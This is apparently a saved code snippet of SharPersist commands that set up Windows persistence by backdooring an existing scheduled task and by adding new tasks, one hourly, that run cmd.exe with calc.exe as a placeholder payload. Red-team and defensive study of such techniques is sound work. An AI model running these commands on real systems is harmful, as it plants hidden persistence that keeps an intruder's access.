---
id: e6586de6-260c-46a7-b597-cf1f64403597
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.837769+00:00'
updated_at: '2023-04-10T20:37:30.433027+00:00'
---

# Code Snippet e6586de6

**Language**: Powershell

```powershell
# Add to a current scheduled task
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add

# Add new task
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
```


